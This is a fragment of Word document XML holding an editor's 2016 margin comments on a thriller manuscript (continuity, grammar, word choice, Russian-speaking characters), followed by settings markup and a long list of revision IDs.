    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Continuity note—I didn’t notice payment having been made for any goods so far.  It might be best to have a sentence or two showing a jaded employee leadenly ringing up the items a few pages back.  Then, there’s the issue of her opening the bottle in the next paragraph.  Anyway, it’s fixable with just a couple of sentences.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1914" w:author="TextVet" w:date="2016-03-20T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I like this foil in speaking style to his.  The longer pause caused by the period may be grammatically incorrect, but the effect is worth it.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1922" w:author="TextVet" w:date="2016-03-20T14:41:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>‘Like’ means these aren’t on show, only copycat brands. If you mean otherwise, use ‘such as’.  I didn’t want to take the liberty!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1943" w:author="TextVet" w:date="2016-03-20T15:00:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">I know this bit’s reverie, but are Rite Aid stores fairly large?  I’m envisioning a lone night clerk playing Facebook games near the register at the front.  </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2010" w:author="TextVet" w:date="2016-03-21T16:43:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Misspelling to mirror the angst?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2016" w:author="TextVet" w:date="2016-03-21T16:56:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Another great blurb piece—worthy of the trailer!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2113" w:author="TextVet" w:date="2016-03-22T10:52:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>It might be the Briton in me, but ‘dived’ is my way.  Well, if it’s legit in the US, ‘dove’ it is!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2142" w:author="TextVet" w:date="2016-03-22T12:23:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>It might be good to describe the gun type—ammo concerns may creep in otherwise.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2174" w:author="TextVet" w:date="2016-03-22T13:01:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I think it’s more of a flash, crackle and stop than a crack?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2178" w:author="TextVet" w:date="2016-03-22T13:07:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I see! Perhaps mention its general shape earlier, or not—it’s not that important; I just worry about these things.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2214" w:author="TextVet" w:date="2016-03-22T14:14:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I’m sorry that  I haven’t been consistent with spacing the subchapters—I’m unsure how much room you’d envisioned.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2297" w:author="TextVet" w:date="2016-03-29T14:59:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>‘May’, but  it’s your call as to her nature in the moment.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2309" w:author="TextVet" w:date="2016-03-22T16:22:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Le mot juste! This is a roastingly hot scene. Keep it coming, but not too too quickly!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2447" w:author="TextVet" w:date="2016-03-23T15:43:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Bloody Ace!  Right on! </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2513" w:author="TextVet" w:date="2016-03-23T16:07:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I was about to comment about the reversal of first and last name.  Okay—I get it.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2515" w:author="TextVet" w:date="2016-03-23T16:12:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>This is in Russian, so his ‘newfound fluidity’ may not have to matter. I just thought I’d flag up that he can speak very well.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2654" w:author="TextVet" w:date="2016-03-25T09:37:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Splendid ending!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2746" w:author="TextVet" w:date="2016-03-28T10:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Hmm…If lower case is called for to preserve validity, then we should perhaps leave it so.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2793" w:author="TextVet" w:date="2016-03-28T10:59:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I’m not sure if you meant that the thermostat is obscured or blackscreened?  If not, perhaps 125 degrees might be prudent?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2822" w:author="TextVet" w:date="2016-03-28T11:22:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I’m leaving this in to chime in with his Russianness.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2830" w:author="TextVet" w:date="2016-03-28T11:31:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Is that like acid?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="2964" w:author="TextVet" w:date="2016-03-29T10:10:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Cool—that ties it up: the prostitutes had vanished during the battle. Were they sheltering upstairs?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="3107" w:author="TextVet" w:date="2016-03-29T12:43:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">I’d be tempted to make it scarlet, attributable to either the strange lighting or this villain’s blood chemistry…or both! </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="3212" w:author="TextVet" w:date="2016-03-29T14:18:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Vernacular, so stet. Saying ‘who’ mightn’t become Alyssa here.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="3259" w:author="TextVet" w:date="2016-03-29T14:37:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Pause for effect—understood.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536D43"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C2549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khail Voloshin">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="757ae342e13872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activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="131078" w:nlCheck="1" w:checkStyle="0"/>
  <w:trackRevisions/>
  <w:defaultTabStop w:val="720"/>
  <w:characterSpacingControl w:val="doNotCompress"/>
  <w:compat>
    <w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="12"/>
  </w:compat>
  <w:rsids>
    <w:rsidRoot w:val="000D3488"/>
    <w:rsid w:val="0000053B"/>
    <w:rsid w:val="000005FF"/>
    <w:rsid w:val="00002334"/>
    <w:rsid w:val="00003813"/>
    <w:rsid w:val="00003A6E"/>
    <w:rsid w:val="00004318"/>
    <w:rsid w:val="00007776"/>
    <w:rsid w:val="00007D15"/>
    <w:rsid w:val="00010EB5"/>
    <w:rsid w:val="00011B6B"/>
    <w:rsid w:val="00012F81"/>
    <w:rsid w:val="00013582"/>
    <w:rsid w:val="00013FB6"/>
    <w:rsid w:val="00014B85"/>
    <w:rsid w:val="00015BFF"/>
    <w:rsid w:val="000245F4"/>
    <w:rsid w:val="00024E02"/>
    <w:rsid w:val="00025F0F"/>
    <w:rsid w:val="00030422"/>
    <w:rsid w:val="00031E9B"/>
    <w:rsid w:val="00034216"/>
    <w:rsid w:val="000351D8"/>
    <w:rsid w:val="00035F25"/>
    <w:rsid w:val="0003623A"/>
    <w:rsid w:val="000362AA"/>
    <w:rsid w:val="00041C06"/>
    <w:rsid w:val="00042F36"/>
    <w:rsid w:val="00045666"/>
    <w:rsid w:val="000457AD"/>
    <w:rsid w:val="0004654F"/>
    <w:rsid w:val="0004716F"/>
    <w:rsid w:val="000473A9"/>
    <w:rsid w:val="00047772"/>
    <w:rsid w:val="00047B8E"/>
    <w:rsid w:val="00050BE7"/>
    <w:rsid w:val="00051D3E"/>
    <w:rsid w:val="00052AB1"/>
    <w:rsid w:val="00052BEB"/>
    <w:rsid w:val="0005347F"/>
    <w:rsid w:val="00054676"/>
    <w:rsid w:val="0005675F"/>
    <w:rsid w:val="000609D7"/>
    <w:rsid w:val="000618CE"/>
    <w:rsid w:val="00063594"/>
    <w:rsid w:val="00063AE4"/>
    <w:rsid w:val="00066C48"/>
    <w:rsid w:val="00067424"/>
    <w:rsid w:val="00071A45"/>
    <w:rsid w:val="00073E21"/>
    <w:rsid w:val="00073E46"/>
    <w:rsid w:val="0007729B"/>
    <w:rsid w:val="000772A1"/>
    <w:rsid w:val="00077B86"/>
    <w:rsid w:val="000801C2"/>
    <w:rsid w:val="00080513"/>
    <w:rsid w:val="00080DF8"/>
    <w:rsid w:val="00082FAD"/>
    <w:rsid w:val="00084149"/>
    <w:rsid w:val="000841A8"/>
    <w:rsid w:val="000857CE"/>
    <w:rsid w:val="00085D5E"/>
    <w:rsid w:val="0008728C"/>
    <w:rsid w:val="00090891"/>
    <w:rsid w:val="00090911"/>
    <w:rsid w:val="00092777"/>
    <w:rsid w:val="00092BDF"/>
    <w:rsid w:val="00095164"/>
    <w:rsid w:val="00095643"/>
    <w:rsid w:val="0009565C"/>
    <w:rsid w:val="000A3937"/>
    <w:rsid w:val="000A437A"/>
    <w:rsid w:val="000A44E3"/>
    <w:rsid w:val="000A6C94"/>
    <w:rsid w:val="000B09E7"/>
    <w:rsid w:val="000B23B1"/>
    <w:rsid w:val="000B3166"/>
    <w:rsid w:val="000B5D1B"/>
    <w:rsid w:val="000B609F"/>
    <w:rsid w:val="000B62D1"/>
    <w:rsid w:val="000B6F93"/>
    <w:rsid w:val="000C0C1D"/>
    <w:rsid w:val="000C192D"/>
    <w:rsid w:val="000C21A3"/>
    <w:rsid w:val="000C2669"/>
    <w:rsid w:val="000C45E0"/>
    <w:rsid w:val="000C4642"/>
    <w:rsid w:val="000C4A29"/>
    <w:rsid w:val="000C4D8E"/>
    <w:rsid w:val="000C6391"/>
    <w:rsid w:val="000C6FFC"/>
    <w:rsid w:val="000D0516"/>
    <w:rsid w:val="000D3488"/>
    <w:rsid w:val="000D3B0E"/>
    <w:rsid w:val="000D4CC4"/>
    <w:rsid w:val="000D63DA"/>
    <w:rsid w:val="000D6C48"/>
    <w:rsid w:val="000D6FC6"/>
    <w:rsid w:val="000D781F"/>
    <w:rsid w:val="000E07AE"/>
    <w:rsid w:val="000E3346"/>
    <w:rsid w:val="000E5281"/>
    <w:rsid w:val="000E5A02"/>
    <w:rsid w:val="000E65D1"/>
    <w:rsid w:val="000E6DF1"/>
    <w:rsid w:val="000E72C4"/>
    <w:rsid w:val="000E79F9"/>
    <w:rsid w:val="000F2FB2"/>
    <w:rsid w:val="000F48B7"/>
    <w:rsid w:val="000F6E07"/>
    <w:rsid w:val="000F7202"/>
    <w:rsid w:val="000F7501"/>
    <w:rsid w:val="000F7D68"/>
    <w:rsid w:val="00100236"/>
    <w:rsid w:val="001030C9"/>
    <w:rsid w:val="00105E36"/>
    <w:rsid w:val="001069A9"/>
    <w:rsid w:val="001069E0"/>
    <w:rsid w:val="001111C7"/>
    <w:rsid w:val="001113C6"/>
    <w:rsid w:val="0011313A"/>
    <w:rsid w:val="00113690"/>
    <w:rsid w:val="0011484F"/>
    <w:rsid w:val="001158EC"/>
    <w:rsid w:val="001170B6"/>
    <w:rsid w:val="00120C78"/>
    <w:rsid w:val="00123EC3"/>
    <w:rsid w:val="00124092"/>
    <w:rsid w:val="001271B5"/>
    <w:rsid w:val="0012731A"/>
    <w:rsid w:val="0013011C"/>
    <w:rsid w:val="00131A45"/>
    <w:rsid w:val="001334E3"/>
    <w:rsid w:val="00134399"/>
    <w:rsid w:val="001349B5"/>
    <w:rsid w:val="00134BC3"/>
    <w:rsid w:val="001353C1"/>
    <w:rsid w:val="00136016"/>
    <w:rsid w:val="0013615E"/>
    <w:rsid w:val="00136812"/>
    <w:rsid w:val="00137A39"/>
    <w:rsid w:val="00142CE8"/>
    <w:rsid w:val="00142FEF"/>
    <w:rsid w:val="00143C20"/>
    <w:rsid w:val="001447B7"/>
    <w:rsid w:val="00145512"/>
    <w:rsid w:val="00145B8E"/>
    <w:rsid w:val="0015288E"/>
    <w:rsid w:val="00152B87"/>
    <w:rsid w:val="00153A79"/>
    <w:rsid w:val="0015461A"/>
    <w:rsid w:val="0015479A"/>
    <w:rsid w:val="00156055"/>
    <w:rsid w:val="001565F4"/>
    <w:rsid w:val="0015686C"/>
    <w:rsid w:val="00156C7C"/>
    <w:rsid w:val="00156CD7"/>
    <w:rsid w:val="00156F70"/>
    <w:rsid w:val="00160029"/>
    <w:rsid w:val="0016298D"/>
    <w:rsid w:val="00162E76"/>
    <w:rsid w:val="00164721"/>
    <w:rsid w:val="001712FE"/>
    <w:rsid w:val="00171436"/>
    <w:rsid w:val="00172F5A"/>
    <w:rsid w:val="00173D80"/>
    <w:rsid w:val="001750AF"/>
    <w:rsid w:val="00176323"/>
    <w:rsid w:val="0017791C"/>
    <w:rsid w:val="00180071"/>
    <w:rsid w:val="001813BE"/>
    <w:rsid w:val="001842FA"/>
    <w:rsid w:val="00184B69"/>
    <w:rsid w:val="00187FBB"/>
    <w:rsid w:val="00190763"/>
    <w:rsid w:val="001908C1"/>
    <w:rsid w:val="001924AF"/>
    <w:rsid w:val="00192DF0"/>
    <w:rsid w:val="00193D9B"/>
    <w:rsid w:val="00195053"/>
    <w:rsid w:val="00195866"/>
    <w:rsid w:val="001A09A0"/>
    <w:rsid w:val="001A401C"/>
    <w:rsid w:val="001A40F6"/>
    <w:rsid w:val="001A49B6"/>
    <w:rsid w:val="001A6104"/>
    <w:rsid w:val="001A62A1"/>
    <w:rsid w:val="001A69ED"/>
    <w:rsid w:val="001A7D4B"/>
    <w:rsid w:val="001B0243"/>
    <w:rsid w:val="001B0B32"/>
    <w:rsid w:val="001B172A"/>
    <w:rsid w:val="001B1BAA"/>
    <w:rsid w:val="001B3B93"/>
    <w:rsid w:val="001B46AF"/>
    <w:rsid w:val="001B4AF8"/>
    <w:rsid w:val="001B75C4"/>
    <w:rsid w:val="001C0433"/>
    <w:rsid w:val="001C3044"/>
    <w:rsid w:val="001C4615"/>
    <w:rsid w:val="001C4C42"/>
    <w:rsid w:val="001C61C9"/>
    <w:rsid w:val="001C66D2"/>
    <w:rsid w:val="001C69FA"/>
    <w:rsid w:val="001C7319"/>
    <w:rsid w:val="001D071A"/>
    <w:rsid w:val="001D129A"/>
    <w:rsid w:val="001D1886"/>
    <w:rsid w:val="001D1B05"/>
    <w:rsid w:val="001D228F"/>
    <w:rsid w:val="001D715D"/>
    <w:rsid w:val="001E1BE1"/>
    <w:rsid w:val="001E2376"/>
    <w:rsid w:val="001E2E02"/>
    <w:rsid w:val="001E4353"/>
    <w:rsid w:val="001E4A27"/>
    <w:rsid w:val="001E6376"/>
    <w:rsid w:val="001F0804"/>
    <w:rsid w:val="001F0CB6"/>
    <w:rsid w:val="001F12DA"/>
    <w:rsid w:val="001F2788"/>
    <w:rsid w:val="001F6813"/>
    <w:rsid w:val="002023F4"/>
    <w:rsid w:val="00202683"/>
    <w:rsid w:val="00203A40"/>
    <w:rsid w:val="00204807"/>
    <w:rsid w:val="002054A4"/>
    <w:rsid w:val="00210377"/>
    <w:rsid w:val="00212B8A"/>
    <w:rsid w:val="0021621D"/>
    <w:rsid w:val="002167E9"/>
    <w:rsid w:val="002216A2"/>
    <w:rsid w:val="0022262F"/>
    <w:rsid w:val="00222A80"/>
    <w:rsid w:val="002237DF"/>
    <w:rsid w:val="00224D33"/>
    <w:rsid w:val="002251CE"/>
    <w:rsid w:val="002259F7"/>
    <w:rsid w:val="0022706E"/>
    <w:rsid w:val="00232875"/>
    <w:rsid w:val="00232D9C"/>
    <w:rsid w:val="00233A3F"/>
    <w:rsid w:val="00234A4E"/>
    <w:rsid w:val="00235AF2"/>
    <w:rsid w:val="00235F14"/>
    <w:rsid w:val="002364A9"/>
    <w:rsid w:val="00236C14"/>
    <w:rsid w:val="00240371"/>
    <w:rsid w:val="00240CDE"/>
    <w:rsid w:val="00240DCE"/>
    <w:rsid w:val="00241C34"/>
    <w:rsid w:val="00242632"/>
    <w:rsid w:val="00242EBA"/>
    <w:rsid w:val="002436C5"/>
    <w:rsid w:val="00243EFC"/>
    <w:rsid w:val="002444ED"/>
    <w:rsid w:val="00244CB6"/>
    <w:rsid w:val="0024522A"/>
    <w:rsid w:val="00245E2C"/>
    <w:rsid w:val="00247B79"/>
    <w:rsid w:val="00247CBC"/>
    <w:rsid w:val="002513B8"/>
    <w:rsid w:val="00252FFA"/>
    <w:rsid w:val="002557E9"/>
    <w:rsid w:val="002558F2"/>
    <w:rsid w:val="00260EA5"/>
    <w:rsid w:val="0026163D"/>
    <w:rsid w:val="002618E1"/>
    <w:rsid w:val="0026234D"/>
    <w:rsid w:val="0026287F"/>
    <w:rsid w:val="002631DB"/>
    <w:rsid w:val="00264725"/>
    <w:rsid w:val="00265647"/>
    <w:rsid w:val="002662C5"/>
    <w:rsid w:val="00267C0D"/>
    <w:rsid w:val="002702DB"/>
    <w:rsid w:val="00272946"/>
    <w:rsid w:val="0027463A"/>
    <w:rsid w:val="0027504E"/>
    <w:rsid w:val="00275533"/>
    <w:rsid w:val="00277430"/>
    <w:rsid w:val="0027763F"/>
    <w:rsid w:val="002837F2"/>
    <w:rsid w:val="00283EF0"/>
    <w:rsid w:val="00286467"/>
    <w:rsid w:val="00292E78"/>
    <w:rsid w:val="0029329A"/>
    <w:rsid w:val="00293950"/>
    <w:rsid w:val="00293ABA"/>
    <w:rsid w:val="002950C0"/>
    <w:rsid w:val="002967B9"/>
    <w:rsid w:val="00297067"/>
    <w:rsid w:val="00297140"/>
    <w:rsid w:val="002A014D"/>
    <w:rsid w:val="002A30F3"/>
    <w:rsid w:val="002A45A2"/>
    <w:rsid w:val="002A4B80"/>
    <w:rsid w:val="002A5149"/>
    <w:rsid w:val="002A6AF7"/>
    <w:rsid w:val="002A7BA6"/>
    <w:rsid w:val="002B034A"/>
    <w:rsid w:val="002B37E1"/>
    <w:rsid w:val="002B4AF7"/>
    <w:rsid w:val="002B5D67"/>
    <w:rsid w:val="002B67BD"/>
    <w:rsid w:val="002B6BB6"/>
    <w:rsid w:val="002C0406"/>
    <w:rsid w:val="002C0C71"/>
    <w:rsid w:val="002C6500"/>
    <w:rsid w:val="002C6FFA"/>
    <w:rsid w:val="002D0070"/>
    <w:rsid w:val="002D0774"/>
    <w:rsid w:val="002D0928"/>
    <w:rsid w:val="002D15CA"/>
    <w:rsid w:val="002D27D1"/>
    <w:rsid w:val="002D32AD"/>
    <w:rsid w:val="002D333C"/>
    <w:rsid w:val="002D3842"/>
    <w:rsid w:val="002D3C71"/>
    <w:rsid w:val="002D53FC"/>
    <w:rsid w:val="002D7E3D"/>
    <w:rsid w:val="002E3AA8"/>
    <w:rsid w:val="002E428A"/>
    <w:rsid w:val="002E6C0A"/>
    <w:rsid w:val="002E7174"/>
    <w:rsid w:val="002F4971"/>
    <w:rsid w:val="002F5175"/>
    <w:rsid w:val="002F7B33"/>
    <w:rsid w:val="00302DAC"/>
    <w:rsid w:val="003047C9"/>
    <w:rsid w:val="003117BC"/>
    <w:rsid w:val="00312062"/>
    <w:rsid w:val="00312CAA"/>
    <w:rsid w:val="00312E4B"/>
    <w:rsid w:val="00313538"/>
    <w:rsid w:val="003141A8"/>
    <w:rsid w:val="00314B2E"/>
    <w:rsid w:val="00316644"/>
    <w:rsid w:val="003169EF"/>
    <w:rsid w:val="00316B6C"/>
    <w:rsid w:val="00317167"/>
    <w:rsid w:val="00317A2F"/>
    <w:rsid w:val="0032103D"/>
    <w:rsid w:val="00321965"/>
    <w:rsid w:val="00322FA5"/>
    <w:rsid w:val="00323525"/>
    <w:rsid w:val="00323A07"/>
    <w:rsid w:val="00326066"/>
    <w:rsid w:val="00331519"/>
    <w:rsid w:val="00332FE3"/>
    <w:rsid w:val="0033316F"/>
    <w:rsid w:val="00333D2C"/>
    <w:rsid w:val="00334707"/>
    <w:rsid w:val="00335811"/>
    <w:rsid w:val="003416C9"/>
    <w:rsid w:val="0034374B"/>
    <w:rsid w:val="00346236"/>
    <w:rsid w:val="00346253"/>
    <w:rsid w:val="0035065D"/>
    <w:rsid w:val="00353BC2"/>
    <w:rsid w:val="0035494B"/>
    <w:rsid w:val="003567B1"/>
    <w:rsid w:val="00356EE7"/>
    <w:rsid w:val="00357EEE"/>
    <w:rsid w:val="00361188"/>
    <w:rsid w:val="003613C5"/>
    <w:rsid w:val="003618C6"/>
    <w:rsid w:val="003633E5"/>
    <w:rsid w:val="0036393C"/>
    <w:rsid w:val="00363D78"/>
    <w:rsid w:val="0036522D"/>
    <w:rsid w:val="0036621D"/>
    <w:rsid w:val="00366734"/>
    <w:rsid w:val="00370042"/>
    <w:rsid w:val="00370301"/>
    <w:rsid w:val="0037114D"/>
    <w:rsid w:val="00372982"/>
    <w:rsid w:val="003742DC"/>
    <w:rsid w:val="003750D2"/>
    <w:rsid w:val="00376714"/>
    <w:rsid w:val="00381D4A"/>
    <w:rsid w:val="00381DDC"/>
    <w:rsid w:val="00382B3F"/>
    <w:rsid w:val="00382BE8"/>
    <w:rsid w:val="00384055"/>
    <w:rsid w:val="003844A1"/>
    <w:rsid w:val="003905A5"/>
    <w:rsid w:val="003911F9"/>
    <w:rsid w:val="00391537"/>
    <w:rsid w:val="00392456"/>
    <w:rsid w:val="00392F30"/>
    <w:rsid w:val="00393895"/>
    <w:rsid w:val="00393D9F"/>
    <w:rsid w:val="00394EEF"/>
    <w:rsid w:val="00395D41"/>
    <w:rsid w:val="00396326"/>
    <w:rsid w:val="0039669C"/>
    <w:rsid w:val="00397E60"/>
    <w:rsid w:val="003A0583"/>
    <w:rsid w:val="003A170D"/>
    <w:rsid w:val="003A1987"/>
    <w:rsid w:val="003A3170"/>
    <w:rsid w:val="003A33CD"/>
    <w:rsid w:val="003A3C69"/>
    <w:rsid w:val="003A54F0"/>
    <w:rsid w:val="003A70DF"/>
    <w:rsid w:val="003B10EB"/>
    <w:rsid w:val="003B2EC3"/>
    <w:rsid w:val="003B4272"/>
    <w:rsid w:val="003B4471"/>
    <w:rsid w:val="003B5DE4"/>
    <w:rsid w:val="003B6561"/>
    <w:rsid w:val="003B6C62"/>
    <w:rsid w:val="003C112F"/>
    <w:rsid w:val="003C1BC5"/>
    <w:rsid w:val="003C1C39"/>
    <w:rsid w:val="003C2473"/>
    <w:rsid w:val="003C2C5C"/>
    <w:rsid w:val="003C3FE0"/>
    <w:rsid w:val="003C4B17"/>
    <w:rsid w:val="003C5048"/>
    <w:rsid w:val="003D013E"/>
    <w:rsid w:val="003D13DA"/>
    <w:rsid w:val="003D2567"/>
    <w:rsid w:val="003D370D"/>
    <w:rsid w:val="003D568C"/>
    <w:rsid w:val="003D5BB3"/>
